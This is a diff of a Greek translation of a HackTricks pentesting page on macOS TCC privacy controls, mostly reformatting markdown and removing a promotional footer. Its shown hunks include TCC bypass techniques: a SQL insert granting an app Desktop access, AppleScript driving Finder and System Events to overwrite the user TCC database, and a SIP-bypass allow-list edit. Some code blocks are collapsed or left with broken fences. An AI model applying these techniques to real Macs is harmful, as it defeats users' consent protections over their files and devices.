@@ -27,11 +27,13 @@
 Υπάρχει ένα **tccd χρήστη σε λειτουργία χρήστη** που τρέχει ανά λογαριασμό χρήστη που ορίζεται στο `/System/Library/LaunchAgents/com.apple.tccd.plist` καταχωρίζοντας τις υπηρεσίες mach `com.apple.tccd` και `com.apple.usernotifications.delegate.com.apple.tccd`.
 
 Εδώ μπορείτε να δείτε το tccd να τρέχει ως σύστημα και ως χρήστη:
+
 ```bash
 ps -ef | grep tcc
 0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
 501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
 ```
+
 Οι άδειες κληρονομούνται από τη γονική εφαρμογή και τα δικαιώματα παρακολουθούνται με βάση το Bundle ID και το Developer ID.
 
 ### Βάσεις Δεδομένων TCC
@@ -135,6 +137,7 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 <summary>Πώς να εκτελέσετε αν είναι απόλυτη διαδρομή</summary>
 
 Απλά κάντε **`launctl load you_bin.plist`**, με ένα plist όπως:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -171,11 +174,13 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 </dict>
 </plist>
 ```
+
 </details>
 
 * Η τιμή **`auth_value`** μπορεί να έχει διαφορετικές τιμές: denied(0), unknown(1), allowed(2), ή limited(3).
 * Το πεδίο **`auth_reason`** μπορεί να πάρει τις ακόλουθες τιμές: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
 * Το πεδίο **csreq** υπάρχει για να υποδείξει πώς να επαληθευτεί το δυαδικό αρχείο που θα εκτελεστεί και να χορηγηθούν οι άδειες TCC:
+
 ```bash
 # Query to get cserq in printable hex
 select service, client, hex(csreq) from access where auth_value=2;
@@ -191,6 +196,7 @@ echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
 REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
 echo "X'$REQ_HEX'"
 ```
+
 * Για περισσότερες πληροφορίες σχετικά με τα **άλλα πεδία** του πίνακα [**ελέγξτε αυτήν την ανάρτηση στο blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
 
 Μπορείτε επίσης να ελέγξετε τις **άδειες που έχουν δοθεί ήδη** σε εφαρμογές στο `Προτιμήσεις Συστήματος --> Ασφάλεια & Απορρήτου --> Απορρήτου --> Αρχεία και Φάκελοι`.
@@ -200,6 +206,7 @@ echo "X'$REQ_HEX'"
 {% endhint %}
 
 #### Επαναφορά δικαιωμάτων TCC
+
 ```bash
 # You can reset all the permissions given to an application with
 tccutil reset All app.some.id
@@ -207,9 +214,11 @@ tccutil reset All app.some.id
 # Reset the permissions granted to all apps
 tccutil reset All
 ```
+
 ### TCC Έλεγχοι Υπογραφής
 
 Η **βάση δεδομένων** του TCC αποθηκεύει το **Bundle ID** της εφαρμογής, αλλά αποθηκεύει επίσης **πληροφορίες** σχετικά με τη **υπογραφή** για να **διασφαλίσει** ότι η εφαρμογή που ζητάει την άδεια χρήσης είναι η σωστή.
+
 ```bash
 # From sqlite
 sqlite> select service, client, hex(csreq) from access where auth_value=2;
@@ -221,7 +230,6 @@ echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E00000000000
 csreq -t -r /tmp/telegram_csreq.bin
 (anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
 ```
-{% endcode %}
 
 {% hint style="warning" %}
 Συνεπώς, άλλες εφαρμογές που χρησιμοποιούν το ίδιο όνομα και το αναγνωριστικό δέσμης (bundle ID) δεν θα μπορέσουν να έχουν πρόσβαση στις δικαιώματα που έχουν δοθεί σε άλλες εφαρμογές.
@@ -235,6 +243,7 @@ csreq -t -r /tmp/telegram_csreq.bin
 Ωστόσο, για τις εφαρμογές να **έχουν πρόσβαση** σε **συγκεκριμένους φακέλους χρήστη**, όπως `~/Desktop`, `~/Downloads` και `~/Documents`, **δεν χρειάζεται** να έχουν κάποια συγκεκριμένα **δικαιώματα.** Το σύστημα θα χειριστεί διαφανώς την πρόσβαση και θα **ζητήσει την έγκριση του χρήστη** όπως απαιτείται.
 
 Οι εφαρμογές της Apple **δεν θα παράγουν παράθυρα ενημέρωσης**. Περιέχουν **προκαθορισμένα δικαιώματα** στη λίστα των **δικαιωμάτων τους**, που σημαίνει ότι **ποτέ δεν θα δημιουργήσουν ένα αναδυόμενο παράθυρο**, **ούτε** θα εμφανιστούν σε κάποια από τις **βάσεις δεδομένων TCC.** Για παράδειγμα:
+
 ```bash
 codesign -dv --entitlements :- /System/Applications/Calendar.app
 [...]
@@ -245,6 +254,7 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
 <string>kTCCServiceAddressBook</string>
 </array>
 ```
+
 Αυτό θα αποτρέψει το Ημερολόγιο να ζητήσει από τον χρήστη πρόσβαση σε υπενθυμίσεις, ημερολόγιο και βιβλίο διευθύνσεων.
 
 {% hint style="success" %}
@@ -262,6 +272,7 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
 ### Πρόθεση Χρήστη / com.apple.macl
 
 Όπως αναφέρθηκε προηγουμένως, είναι δυνατόν να **χορηγήσετε πρόσβαση σε μια εφαρμογή για ένα αρχείο σύροντάς το πάνω της**. Αυτή η πρόσβαση δεν θα καθορίζεται σε καμία βάση δεδομένων TCC αλλά ως **επεκταμένο** **χαρακτηριστικό του αρχείου**. Αυτό το χαρακτηριστικό θα **αποθηκεύει το UUID** της επιτρεπόμενης εφαρμογής:
+
 ```bash
 xattr Desktop/private.txt
 com.apple.macl
@@ -276,6 +287,7 @@ Filename,Header,App UUID
 otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
 uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 ```
+
 {% hint style="info" %}
 Είναι περίεργο ότι το χαρακτηριστικό **`com.apple.macl`** διαχειρίζεται από το **Sandbox**, όχι από το tccd.
 
@@ -293,45 +305,9 @@ uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 <details>
 
 <summary>Παράδειγμα Εισαγωγής στο TCC</summary>
-```sql
-INSERT INTO access (
-service,
-client,
-client_type,
-auth_value,
-auth_reason,
-auth_version,
-csreq,
-policy_id,
-indirect_object_identifier_type,
-indirect_object_identifier,
-indirect_object_code_identity,
-flags,
-last_modified,
-pid,
-pid_version,
-boot_uuid,
-last_reminded
-) VALUES (
-'kTCCServiceSystemPolicyDesktopFolder', -- service
-'com.googlecode.iterm2', -- client
-0, -- client_type (0 - bundle id)
-2, -- auth_value  (2 - allowed)
-3, -- auth_reason (3 - "User Set")
-1, -- auth_version (always 1)
-X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
-NULL, -- policy_id
-NULL, -- indirect_object_identifier_type
-'UNUSED', -- indirect_object_identifier - default value
-NULL, -- indirect_object_code_identity
-0, -- flags
-strftime('%s', 'now'), -- last_modified with default current timestamp
-NULL, -- assuming pid is an integer and optional
-NULL, -- assuming pid_version is an integer and optional
-'UNUSED', -- default value for boot_uuid
-strftime('%s', 'now') -- last_reminded with default current timestamp
-);
-```
+
+\`\`\`sql INSERT INTO access ( service, client, client\_type, auth\_value, auth\_reason, auth\_version, csreq, policy\_id, indirect\_object\_identifier\_type, indirect\_object\_identifier, indirect\_object\_code\_identity, flags, last\_modified, pid, pid\_version, boot\_uuid, last\_reminded ) VALUES ( 'kTCCServiceSystemPolicyDesktopFolder', -- service 'com.googlecode.iterm2', -- client 0, -- client\_type (0 - bundle id) 2, -- auth\_value (2 - allowed) 3, -- auth\_reason (3 - "User Set") 1, -- auth\_version (always 1) X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now NULL, -- policy\_id NULL, -- indirect\_object\_identifier\_type 'UNUSED', -- indirect\_object\_identifier - default value NULL, -- indirect\_object\_code\_identity 0, -- flags strftime('%s', 'now'), -- last\_modified with default current timestamp NULL, -- assuming pid is an integer and optional NULL, -- assuming pid\_version is an integer and optional 'UNUSED', -- default value for boot\_uuid strftime('%s', 'now') -- last\_reminded with default current timestamp ); \`\`\`
+
 </details>
 
 ### TCC Payloads
@@ -397,25 +373,14 @@ EOD
 <details>
 
 <summary>Λάβετε ένα κέλυφος μέσα στο Automator</summary>
-```applescript
-osascript<<EOD
-set theScript to "touch /tmp/something"
 
-tell application "Automator"
-set actionID to Automator action id "com.apple.RunShellScript"
-tell (make new workflow)
-add actionID to it
-tell last Automator action
-set value of setting "inputMethod" to 1
-set value of setting "COMMAND_STRING" to theScript
-end tell
-execute it
-end tell
-activate
-end tell
-EOD
-# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
-```
+\`\`\`applescript osascript<
+
+tell application "Automator" set actionID to Automator action id "com.apple.RunShellScript" tell (make new workflow) add actionID to it tell last Automator action set value of setting "inputMethod" to 1 set value of setting "COMMAND\_STRING" to theScript end tell execute it end tell activate end tell EOD
+
+## Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
+
+````
 </details>
 
 Το ίδιο συμβαίνει και με την εφαρμογή **Script Editor,** μπορεί να ελέγχει το Finder, αλλά χρησιμοποιώντας ένα AppleScript δεν μπορείτε να το αναγκάσετε να εκτελέσει ένα σενάριο.
@@ -463,12 +428,14 @@ EOD
 # File operations in the folder should trigger the Folder Action
 touch "$HOME/Desktop/file"
 rm "$HOME/Desktop/file"
-```
-### Αυτοματισμός (SE) + Προσβασιμότητα (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** στο FDA\*
+````
+
+#### Αυτοματισμός (SE) + Προσβασιμότητα (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** στο FDA\*
 
 Ο Αυτοματισμός στο **`System Events`** + Προσβασιμότητα (**`kTCCServicePostEvent`**) επιτρέπει την αποστολή **πληκτρολογίων σε διεργασίες**. Με αυτόν τον τρόπο μπορείτε να καταχραστείτε το Finder για να αλλάξετε τη βάση δεδομένων TCC των χρηστών ή να δώσετε FDA σε οποιαδήποτε εφαρμογή (αν και μπορεί να ζητηθεί κωδικός πρόσβασης γι' αυτό).
 
 Παράδειγμα αντικατάστασης του Finder με τη βάση δεδομένων TCC των χρηστών:
+
 ```applescript
 -- store the TCC.db file to copy in /tmp
 osascript <<EOF
@@ -514,31 +481,32 @@ keystroke "v" using {command down}
 end tell
 EOF
 ```
-### `kTCCServiceAccessibility` σε FDA\*
+
+#### `kTCCServiceAccessibility` σε FDA\*
 
 Ελέγξτε αυτήν τη σελίδα για μερικά [**payloads για κατάχρηση των δικαιωμάτων πρόσβασης**](macos-tcc-payloads.md#accessibility) για προώθηση προνομίων σε FDA\* ή για την εκτέλεση ενός keylogger για παράδειγμα.
 
-### **Πελάτης Ασφάλειας Σημείου Πρόσβασης σε FDA**
+#### **Πελάτης Ασφάλειας Σημείου Πρόσβασης σε FDA**
 
 Αν έχετε **`kTCCServiceEndpointSecurityClient`**, έχετε FDA. Τέλος.
 
-### Αρχείο Συστήματος Πολιτικής Διαχειριστή Αρχείων σε FDA
+#### Αρχείο Συστήματος Πολιτικής Διαχειριστή Αρχείων σε FDA
 
 Το **`kTCCServiceSystemPolicySysAdminFiles`** επιτρέπει τη **τροποποίηση** του χαρακτηριστικού **`NFSHomeDirectory`** ενός χρήστη που αλλάζει τον φάκελο του αρχικού φακέλου και επομένως επιτρέπει τη **παράκαμψη του TCC**.
 
-### Βάση Δεδομένων TCC Χρήστη σε FDA
+#### Βάση Δεδομένων TCC Χρήστη σε FDA
 
 Λαμβάνοντας **δικαιώματα εγγραφής** στη **βάση δεδομένων TCC** του χρήστη δεν μπορείτε να χορηγήσετε στον εαυτό σας δικαιώματα **`FDA`**, μόνο αυτός που βρίσκεται στη βάση δεδομένων του συστήματος μπορεί να το κάνει.
 
 Ωστόσο, μπορείτε να δώσετε στον εαυτό σας **`Δικαιώματα Αυτοματισμού στο Finder`**, και να καταχραστείτε την προηγούμενη τεχνική για προώθηση σε FDA\*.
 
-### **FDA σε δικαιώματα TCC**
+#### **FDA σε δικαιώματα TCC**
 
 Η πρόσβαση **Πλήρους Δίσκου** στο TCC ονομάζεται **`kTCCServiceSystemPolicyAllFiles`**
 
 Δεν νομίζω ότι αυτή είναι μια πραγματική προώθηση προνομίων, αλλά για να είμαστε σίγουροι: Αν ελέγχετε ένα πρόγραμμα με FDA μπορείτε να **τροποποιήσετε τη βάση δεδομένων των χρηστών TCC και να δώσετε στον εαυτό σας οποιαδήποτε πρόσβαση**. Αυτό μπορεί να είναι χρήσιμο ως τεχνική διατήρησης σε περίπτωση που χάσετε τα δικαιώματά σας FDA.
 
-### **Παράκαμψη SIP σε Παράκαμψη TCC**
+#### **Παράκαμψη SIP σε Παράκαμψη TCC**
 
 Η βάση δεδομένων TCC του συστήματος προστατεύεται από το **SIP**, γι' αυτό μόνο διεργασίες με τα **συγκεκριμένα δικαιώματα** θα μπορούν να την τροποποιήσουν. Επομένως, αν ένας επιτιθέμενος βρει μια **παράκαμψη SIP** πάνω σε ένα **αρχείο** (να μπορεί να το τροποποιήσει παρά το SIP), θα μπορεί:
 
@@ -549,13 +517,16 @@ EOF
 
 Ωστόσο, υπάρχει μια άλλη επιλογή για να καταχραστεί αυτήν τη **παράκαμψη SIP για παράκαμψη TCC**, το αρχείο `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` είναι μια λίστα εφαρμογών που απαιτούν μια εξαίρεση TCC. Επομένως, αν ένας επιτιθέμενος μπορεί να **αφαιρέσει την προστασία SIP** από αυτό το αρχείο και να προσθέσει την **δική του εφαρμογή**, η εφαρμογή θα μπορεί να παρακάμψει το TCC.\
 Για παράδειγμα για να προσθέσετε το terminal:
+
 ```bash
 # Get needed info
 codesign -d -r- /System/Applications/Utilities/Terminal.app
 ```
+
 ```plaintext
 Αρχείο AllowApplicationsList.plist:
 ```
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -578,29 +549,14 @@ codesign -d -r- /System/Applications/Utilities/Terminal.app
 </dict>
 </plist>
 ```
-### TCC Παρακάμψεις
 
-{% content-ref url="macos-tcc-bypasses/" %}
-[macos-tcc-bypasses](macos-tcc-bypasses/)
-{% endcontent-ref %}
+#### TCC Παρακάμψεις
 
-## Αναφορές
+### Αναφορές
 
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
 * [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
 * [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
 * [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
-
-<details>
-
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Άλλοι τρόποι υποστήριξης του HackTricks:
-
-* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
 
 </details>
